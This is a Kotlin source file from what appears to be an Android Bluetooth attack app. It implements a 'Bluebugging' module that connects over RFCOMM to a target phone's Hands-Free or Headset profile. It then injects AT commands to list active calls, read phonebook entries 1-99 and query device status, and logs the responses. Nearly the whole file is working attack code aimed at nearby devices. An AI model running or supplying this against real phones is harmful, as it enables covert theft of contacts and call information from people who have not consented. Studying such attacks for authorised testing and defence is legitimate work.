package com.hereliesaz.blusnu.data

import android.annotation.SuppressLint
import android.bluetooth.BluetoothDevice
import android.bluetooth.BluetoothSocket
import android.util.Log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.flow
import kotlinx.coroutines.withContext
import java.io.IOException
import java.io.InputStream
import java.io.OutputStream
import java.util.UUID

/**
 * Module responsible for Bluebugging attacks.
 *
 * Bluebugging exploits the Headset (HSP) and Hands-Free (HFP) Bluetooth profiles
 * to inject AT commands over an RFCOMM connection. A successful attack can allow
 * listing calls, reading the phonebook, querying device status, and more.
 *
 * Requires BLUETOOTH_CONNECT permission and that the target device exposes
 * HSP or HFP services.
 */
@SuppressLint("MissingPermission")
class BluebuggingModule {

    companion object {
        private const val TAG = "BluebuggingModule"

        /** Headset Profile (HSP) UUID */
        private val HSP_UUID: UUID = UUID.fromString("00001108-0000-1000-8000-00805f9b34fb")

        /** Hands-Free Profile (HFP) UUID */
        private val HFP_UUID: UUID = UUID.fromString("0000111e-0000-1000-8000-00805f9b34fb")

        /** Common AT commands used in bluebugging reconnaissance. */
        private val COMMON_AT_COMMANDS = listOf(
            "AT" to "Basic probe",
            "AT+CLCC" to "List current calls",
            "AT+CPBR=1,99" to "Read phonebook entries 1-99",
            "AT+CSCS?" to "Query character set",
            "AT+CIND?" to "Query indicator status"
        )

        /** Read timeout in milliseconds for AT command responses. */
        private const val READ_TIMEOUT_MS = 3000L
    }

    private var socket: BluetoothSocket? = null
    private var outputStream: OutputStream? = null
    private var inputStream: InputStream? = null

    /**
     * Connects to the target device via RFCOMM on the HSP or HFP UUID.
     *
     * Tries HFP first (more capable profile), then falls back to HSP.
     *
     * @param device The BluetoothDevice to connect to.
     * @return Result.success if connected, Result.failure with the exception otherwise.
     */
    suspend fun connect(device: BluetoothDevice): Result<Unit> = withContext(Dispatchers.IO) {
        try {
            disconnect() // Clean up any previous connection

            // Try HFP first, then HSP
            var lastException: Exception? = null
            for (uuid in listOf(HFP_UUID, HSP_UUID)) {
                try {
                    val rfcommSocket = device.createRfcommSocketToServiceRecord(uuid)
                    rfcommSocket.connect()
                    socket = rfcommSocket
                    outputStream = rfcommSocket.outputStream
                    inputStream = rfcommSocket.inputStream
                    Log.i(TAG, "Connected to ${device.address} via UUID $uuid")
                    return@withContext Result.success(Unit)
                } catch (e: IOException) {
                    lastException = e
                    Log.w(TAG, "Failed to connect via UUID $uuid: ${e.message}")
                }
            }
            Result.failure(lastException ?: IOException("Failed to connect via HSP or HFP"))
        } catch (e: SecurityException) {
            Log.e(TAG, "Permission denied connecting to ${device.address}", e)
            Result.failure(e)
        } catch (e: Exception) {
            Log.e(TAG, "Unexpected error connecting to ${device.address}", e)
            Result.failure(e)
        }
    }

    /**
     * Sends an AT command over the established RFCOMM connection and reads the response.
     *
     * The command is terminated with \r\n as required by the AT protocol.
     *
     * @param command The AT command to send (e.g. "AT+CLCC").
     * @return Result containing the response string, or failure if not connected or I/O fails.
     */
    suspend fun sendAtCommand(command: String): Result<String> = withContext(Dispatchers.IO) {
        val os = outputStream
        val iStream = inputStream
        if (os == null || iStream == null || socket?.isConnected != true) {
            return@withContext Result.failure(IllegalStateException("Not connected. Call connect() first."))
        }

        try {
            // Send the AT command with CR+LF terminator
            val commandBytes = "$command\r\n".toByteArray(Charsets.UTF_8)
            os.write(commandBytes)
            os.flush()

            // Read the response with a timeout
            val response = readResponse(iStream)
            Log.d(TAG, "AT command '$command' -> '$response'")
            Result.success(response)
        } catch (e: IOException) {
            Log.e(TAG, "I/O error sending AT command '$command'", e)
            Result.failure(e)
        }
    }

    /**
     * Connects to the target and executes a sequence of common AT commands,
     * emitting each command and its response as flow events.
     *
     * @param device The BluetoothDevice to probe.
     * @return A Flow of strings describing each command attempt and result.
     */
    fun executeCommonCommands(device: BluetoothDevice): Flow<String> = flow {
        emit("Connecting to ${device.address} for AT command injection...")

        val connectResult = connect(device)
        if (connectResult.isFailure) {
            emit("Connection failed: ${connectResult.exceptionOrNull()?.message}")
            return@flow
        }
        emit("Connected successfully via RFCOMM (HSP/HFP)")

        for ((command, description) in COMMON_AT_COMMANDS) {
            emit("Sending: $command ($description)")
            val result = sendAtCommand(command)
            if (result.isSuccess) {
                val response = result.getOrDefault("")
                if (response.isNotBlank()) {
                    emit("Response: $response")
                } else {
                    emit("Response: (empty)")
                }
            } else {
                emit("Error: ${result.exceptionOrNull()?.message}")
                // If we get an IOException the socket is likely dead
                if (result.exceptionOrNull() is IOException) {
                    emit("Connection lost. Aborting remaining commands.")
                    break
                }
            }
        }

        emit("AT command sequence complete.")
        disconnect()
        emit("Disconnected.")
    }

    /**
     * Closes the RFCOMM socket and releases resources.
     */
    fun disconnect() {
        try {
            outputStream?.close()
        } catch (_: IOException) { }
        try {
            inputStream?.close()
        } catch (_: IOException) { }
        try {
            socket?.close()
        } catch (_: IOException) { }
        outputStream = null
        inputStream = null
        socket = null
        Log.d(TAG, "Disconnected and cleaned up resources")
    }

    /**
     * Reads a response from the input stream with a simple timeout mechanism.
     * Waits for data to become available, then reads until no more data arrives
     * within a short window.
     */
    private fun readResponse(inputStream: InputStream): String {
        val buffer = ByteArray(1024)
        val result = StringBuilder()
        val deadline = System.currentTimeMillis() + READ_TIMEOUT_MS

        while (System.currentTimeMillis() < deadline) {
            if (inputStream.available() > 0) {
                val bytesRead = inputStream.read(buffer)
                if (bytesRead > 0) {
                    result.append(String(buffer, 0, bytesRead, Charsets.UTF_8))
                    // Check if we got a final response indicator (OK, ERROR, etc.)
                    val current = result.toString()
                    if (current.contains("OK") || current.contains("ERROR") ||
                        current.contains("+CME ERROR") || current.contains("+CMS ERROR")
                    ) {
                        break
                    }
                }
            } else {
                // Brief sleep to avoid busy-waiting
                Thread.sleep(50)
            }
        }
        return result.toString().trim()
    }
}
